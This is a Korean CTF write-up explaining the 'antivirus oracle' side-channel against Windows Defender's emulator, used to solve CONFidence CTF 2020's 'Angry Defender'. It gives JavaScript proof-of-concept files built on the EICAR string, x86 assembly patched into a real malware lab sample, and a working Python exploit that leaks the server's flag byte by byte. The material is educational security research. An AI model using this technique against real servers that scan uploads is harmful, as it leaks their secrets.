---
layout: post
title:  "AntiVirus Oracle"
date:   2020-03-19 20:30
author: RBTree
tags: [antivirus, CTF]
---

# 서론

CONFidence CTF 2020 Teaser라는 대회에서 Angry Defender라는 문제가 나왔습니다. 해당 문제는 Windows Defender의 특성을 이용해서 문제의 답에 해당하는 Flag를 얻어내는 문제었는데, 이 방법이 흥미로워서 이번에 공유하게 되었습니다.

# 본론

## AV Oracle이란?

일반적으로 보안에서 Oracle이라는 이름이 붙은 공격들은 서버가 원하는 정보를 알고 있고 서버와 Interactive하게 통신이 가능할 때 해당 정보의 일부를 유출시킬 수 있는 공격들입니다. 대표적으로 Padding oracle attack과 RSA LSB oracle attack이 있습니다. (공교롭게도 둘은 모두 암호학적 공격이네요.)

AV Oracle은 일반적인 컴퓨터 환경에서 사용되는 Antivirus의 특성을 이용한 공격 방식입니다. 이 공격은 다음과 같은 환경에서 이뤄집니다.

- 서버에서 Antivirus가 실행 중인 상태
- Antivirus는 심각한 malware 파일을 감지하면 이를 즉시 삭제함
- 공격자가 서버에 데이터를 전송하면, 서버가 해당 데이터에 공격자가 알아내고 싶어하는 정보를 덧붙여서 파일 형태로 저장
- 해당 파일이 삭제된다면 공격자가 이를 감지할 수 있음

공격은 다음과 같은 과정으로 이뤄집니다.

1. 공격자가 특정 형태의 Malware를 보내, 해당 Malware가 삭제되는지 확인
2. 이 Malware를 변형해, 알아내고 싶어하는 정보에 따라서 Antivirus가 Malware로 인식하거나 인식하지 않게 해 정보의 일부분을 유출시킴
3. 이 과정을 반복해 정보를 완전히 유출

이제 동작 원리를 좀 더 자세히 이해해봅시다.

## Windows Defender에서 AV Oracle의 작동 원리

가장 쉽게 이해가 안 가는 부분은 "알아내고 싶어하는 정보에 따라서 Antivirus가 Malware로 인식하거나 인식하지 않게 해 정보의 일부분을 유출시킴" 이라는 부분일 것입니다. 이에 대해서 좀 더 자세히 알아봅시다.

### Emulation

전통적인 Antivirus 방법론은 파일을 스캔한 뒤, 해당 파일에 Malware signature가 있는지 살펴보는 것입니다. Malware signature는 Malware의 hash value나, Malware의 특징이 되는 byte sequence 등이 있을 수 있는데, 이런 정적인 방법론으로는 Malware가 직접 읽지 못하게 Packing 되어있는 경우 감지할 수 없다는 문제가 있습니다.

이를 해결하기 위해서는 Malware를 직접 실행해볼 필요성이 있습니다. 하지만 그대로 실행한다면 문제가 있기 때문 가상 환경을 구축해 Emulation하는 방식으로 이를 검증합니다. (동적 분석) Emulation 과정에서 앞서 언급했던 Malware signature가 발견되거나, 혹은 Malware로부터 쉽게 찾아볼 수 있는 Runtime behavior가 감지된다면 이를 통해 Malware를 발견해 격리하는 것입니다.

쉽게 말하자면, 최근의 Antivirus는 정적으로 Malware가 있는지 검사할 뿐만 아니라 동적으로 Emulation을 통해서 Malware를 실행해 정말로 Malware가 맞는지 검증하는 과정을 거친다는 것입니다.

### How to use emulation

공격 환경에서 "서버가 해당 데이터에 공격자가 알아내고 싶어하는 정보를 덧붙여서 파일 형태로 저장" 한다는 사실을 가정하고 있다는 것을 생각해봅시다. 그러면 우리는 다음과 같은 방법을 사용할 수 있습니다.

1. 공격자가 알아내고 싶은 정보와 공격자가 보낸 데이터 사이의 Offset을 계산
2. 이를 바탕으로 공격자가 알아내고 싶은 정보를 읽는 코드를 작성
3. 읽은 정보를 바탕으로 **Malware를 동적으로 생성하거나, 생성하지 않는 코드를 작성**
   (예를 들어, 알아내고 싶은 정보의 첫 번째 글자가 '1'인지 비교해본 뒤 맞으면 Malware를 생성하고, 아니라면 그대로 종료되는 프로그램)
4. 만약 Antivirus가 동적 분석을 통해 이를 **Malware로 인식한다면 파일을 삭제하게 되고**, 공격자는 이를 감지할 수 있으므로 정보가 유출됨

### Emulation의 범위

![Emulation range](/assets/images/rbtree/antivirus_emulation_range.png)

위 사진은 참고 문헌 2번에서 발췌한 것입니다. 이 이미지를 살펴보면 다음과 같은 Emulation 기능이 내장된 것을 확인할 수 있습니다.

- Binary unpacker (Aspack, VMProtect 등)
  - 압축 파일의 unpacker가 아닙니다! 이에 대해서는 Wikipedia의 [Executable compression](https://en.wikipedia.org/wiki/Executable_compression)를 참고해주세요.
- Parser (X.509 Certificate, .lnk file 등)
- .NET Engine
- JavaScript Engine
- PDF Reader, 7z Unpacker, RAR Unpacker + RarVM Engine
  - 놀랍게도 RAR 파일 형식에서 RarVM이라는 VM을 지원합니다. 최근에는 deprecated 되는 추세입니다.
- 일반적인 PE Binary를 Emulate하는 기능도 포함되어 있음에 유의!

## AV Oracle with JavaScript

다른 파일들은 직접 컴파일해야하기 때문에 구조가 복잡한 감이 있지만, JavaScript는 코드를 평문으로 넣으면 되기 때문에 쉽게 AV Oracle을 테스트해볼 수 있습니다.

우선 테스트를 하려면 Malware가 필요할텐데... 다행히도 Malware는 아니지만 Antivirus가 정상적으로 동작하는지 체크하기 위해 사용되는 [EICAR test file](https://en.wikipedia.org/wiki/EICAR_test_file)이라는 파일이 있습니다. 해당 파일은 다음과 같은 내용으로 구성됩니다.

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

앞으로 이 string을 "EICAR" 라고 언급하겠습니다. 이유는 뒤에서 설명을 위해 삽입한 코드에 이 string을 그대로 넣으면 Windows Defender가 malware로 감지하기 때문입니다. 다른 사람들이 삼성 과제를 제출하기 위해서 git fetch를 받아왔는데 파일이 사라지는 불상사는 없어야겠죠.

이제 다음과 같이 테스트 코드를 작성해봅시다.

```html
<script>
// This comment is for entropy
eval("EICAR"); // EICAR String
</script>
<body>WOW!</body>
```

파일을 직접 테스트 하려면 PowerShell에서 다음과 같이 Trigger하면 됩니다. 파일 경로는 상대 경로가 아닌 절대 경로여야 함에 유의해주세요.

```
& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -Scan -ScanType 3 -File "파일 경로"
```

* 혹시 Trigger가 되지 않는다면, EICAR String을 base64로 encode한 다음 String을 사용하면 높은 확률로 Trigger됩니다.

```
WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoK
```

실행시키면 다음과 같이 Trigger 되는 것을 확인해보실 수 있습니다.

```
PS C:\Users\rbtree\Desktop\Test> & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -Scan -ScanType 3 -File "C:\Users\rbtree\Desktop\Test\test.html"
Scan starting...
Scan finished.
Scanning C:\Users\rbtree\Desktop\Test\test.html found 1 threats.
Cleaning started...
```

그리고 Windows Defender도 같이 반응합니다...

![Windows Defender Alert!](/assets/images/rbtree/windows_defender_alert.png)

---

이제 더 나아가서, 어떻게 동적으로 반응하게 할 지 생각해봅시다.

다음과 같이 코드를 작성해봅시다.

```html
<script>
// This comment is for entrophy
var body = document.body.innerHTML;
var trigger;
trigger = function(v) {
    eval("EICA" + v);
};
trigger(body[0]);
</script>
<body>HiddenData</body>
```

이 코드를 실행하면 `eval("EICAH")`가 실행되고, Trigger되지 않을 것입니다. 만약 HiddenData 대신 RiddleData라고 적혀있었다면 Trigger가 되는 것을 확인할 수 있습니다.

여기에서 더 나아가서 다음과 같이 Trigger해서 한 글자 씩 따내는 것을 생각할 수 있습니다.

```html
<script>
// This comment is for entrophy
var body = document.body.innerHTML;
var trigger;
trigger = function() {
    eval("EICAR");
};
// body[0]을 body[1], body[2] 등으로 바꿔서 위치 변경
// 비교하고 싶은 문자도 "R"에서 자유롭게 변경해 확인
if (body[0].charCodeAt(0) == "R".charCodeAt(0))
	trigger();
</script>
<body>HiddenData</body>
```

여기에서 더 나아가서 한 글자를 이진 탐색하는 방법도 생각해볼 수 있습니다.

```html
<script>
// This comment is for entrophy
var body = document.body.innerHTML;
var trigger;
trigger = function(v) {
    eval("EICA" + v);
};
var n = body[0].charCodeAt(0);
// n이 64보다 크다면 trigger되고, 아니라면 trigger되지 않음
trigger({64: "R"}[Math.min(n, 64)]);
</script>
<body>HiddenData</body>
```

이제 이를 통해서 `<body>` 와 `</body>` 사이에 있는 정보를 얻어낼 수 있습니다.

---

## Angry Defender 풀기

위의 JavaScript를 통한 방식은 다음과 같은 파일 형식으로 구성됩니다.

```html
<script>Attacker's Malicious Script</script><body>Secret Data</body>
```

이 방법의 문제는 서버가 삽입하는 데이터가 **공격자가 보낸 데이터의 중간**에 들어가야 한다는 점입니다. 만약 서버에서 삽입하는 데이터 뒤에 `</body>`를 삽입할 수 없다면, 해당 데이터를 JavaScript 코드를 통해 불러올 수 있는 방법이 없습니다.

Angry Defender의 문제 코드는 다음과 같이 구성되어 있습니다.

```python
import os
import uuid
from collections import OrderedDict
from pathlib import Path
from typing import OrderedDict

from flask import Flask, abort, request

SECRET = os.environ["FLAG"].encode("ascii")
MAX_DATA_SIZE = 1024 * 1024
CACHE_FOLDER = "c:\\storage"
CACHE_SIZE = 256

class LRU:
    def __init__(self, folder: str, max_size: int) -> None:
        self.folder = Path(folder)
        self.max_size = max_size
        self.queue: List[str, ]  = OrderedDict()

    def write(self, key: str, value: bytes) -> None:
        if self.max_size <= len(self.queue):
            retired_key, _ = self.queue.popitem(last=False)
            (self.folder / retired_key).unlink()
        self.queue[key] = None
        (self.folder / key).write_bytes(value)

    def read(self, key: str) -> bytes:
        self.queue.pop(key)
        self.queue[key] = None
        return (self.folder / key).read_bytes()

app = Flask(__name__)
lru = LRU(CACHE_FOLDER, CACHE_SIZE)


@app.route("/cache", methods=["PUT"])
def put() -> str:
    data = request.data
    if MAX_DATA_SIZE < len(data):
        abort(403)
    id = uuid.uuid4()
    lru.write(id.hex, data + SECRET)
    return str(id)


@app.route("/cache/<key>", methods=["GET"])
def get(key: str) -> bytes:
    id = uuid.UUID(key)
    try:
        blob = lru.read(id.hex)
    except KeyError:
        abort(404)
    data = blob[: -len(SECRET)]
    if data + SECRET != blob:
        abort(500)
    return data


if __name__ == "__main__":
    app.run()

```

살펴보면 `SECRET` 값을 유저가 보낸 `data`의 뒤에 덧붙이기 때문에, 위와 같이 JavaScript 코드를 통한 AV Oracle이 불가능함을 알 수 있습니다. 그렇다면 어떻게 트리거 해야 할까요? 답은 일반적인 [PE Binary](https://ko.wikipedia.org/wiki/PE_%ED%8F%AC%EB%A7%B7)를 보내는 것입니다.

문제는 PE 바이너리를 통해서 EICAR string을 통해 쉽게 trigger가 되지 않는다는 점인데요, 이를 풀기 위해서 결국 실제 Malware를 사용해야 했습니다. 그 중에서도 쓰기 쉬운 포맷이 바로 RPISEC의 Malware course에서 제공하는 Lab04의 Malware입니다. ([링크](https://github.com/RPISEC/Malware/blob/master/Labs/Lab_04/Lab_04.zip)) Lab_04-1.malware는 용량이 작을 뿐만 아니라 바이너리의 맨 끝부분이 코드 영역이라는 특징을 가지고 있습니다. 이러한 특성 덕분에 Instruction pointer 값을 얻어내면 바이너리의 맨 끝부분에 덧붙여진 `SECRET`의 위치를 쉽게 알아낼 수 있습니다. 이는 AV Oracle이 필요한 일반적인 상황에서 매우 강력한 특성이기 때문에 기억해두시면 좋을 것 같습니다.

받은 값에 따라서 Malware가 되거나 되지 않게끔 해서 Windows Defender를 trigger해야하기 때문에, 다음과 같은 코드를 해당 Malware의 중간에 inject 합니다.

```assembly
call a
a:
pop ebx			; get eip
add ebx, %d		; %d는 SECRET의 위치
xor eax, eax	; eax = 0
mov al, byte ptr [ebx]
cmp al, %d		; compare
jz b
int 0x3			; 아닐 경우 Malware part로 넘어가지 않고 die
b:				; 이 이후는 Malware part
```

같은 팀원 분이 작성한 exploit입니다. (위의 Malware sample도 직접 찾아오셔서 코드를 작성하셨습니다. 많은 것을 배웠습니다...)

```python
#!/usr/bin/env python2 
import requests
import time
import string

# 31 C0 83 F8 01 EB 01 90 90 CC CC
a = open('Lab_04-1.malware', 'rb').read()

b = a[:512]
c = a[512:]

from pwn import *

import string

def gogo(index, t):
    payload = asm(('''
            call a
            a:
            pop ebx
            add ebx, %d
            xor eax, eax
            mov al, byte ptr [ebx]
            cmp al, {what}
            jz b
            int 0x3
            b:
            ''' % (len(c) + 0x10 + index)).format(what=ord(t)))

    a = b + payload + c

    tmpkey = requests.put('http://angry-defender.zajebistyc.tf/cache', data=a).text
    res = requests.get('http://angry-defender.zajebistyc.tf/cache/{tmpkey}'.format(tmpkey=tmpkey))
    if res.status_code == 500:
        print 'wtf[%d]="%s"' % (index, t)


index = 0

import sys

for t in string.printable:
    t = threading.Thread(target=gogo, args=(int(sys.argv[1]), t))
    t.start()

a = raw_input()
```

# 결론

기존에 JavaScript를 통한 AV Oracle은 1번 참고 문헌에 나와있었지만, JavaScript 이외의 방법을 통해 AV Oracle을 하는 방법에 대한 자료는 없다시피 했습니다.

이번 기회에 Windows Defender에서 어떻게 trigger하고, PE Binary를 통해 AV Oracle를 trigger할 수 있는 강력한 방법을 알게 되어서 기분이 좋습니다.

위를 다시 살펴보면 비단 JS나 PE binary가 아니더라도 trigger되는 다양한 부분이 있기 때문에, 이를 공부해서 관련 문제에 대비해보거나 Windows Defender 자체에 대한 이해도를 높이는 것도 좋은 경험일 것으로 생각됩니다. RarVM을 통해서 trigger 하는 방법에 대해서 흥미가 있기 때문에 다음에 취미로 프로젝트를 진행해볼 지도 모르겠습니다.

---

# 참고 문헌

1. ["Let's Make Windows Defender Angry: Antivirus can be an oracle!"](https://speakerdeck.com/icchy/lets-make-windows-defender-angry-antivirus-can-be-an-oracle?slide=17) By icchy from TokyoWesterns
2. ["Windows Offender: Reverse Engineering Windows Defender's Antivirus Emulator"](https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf) By Alexei Bulazel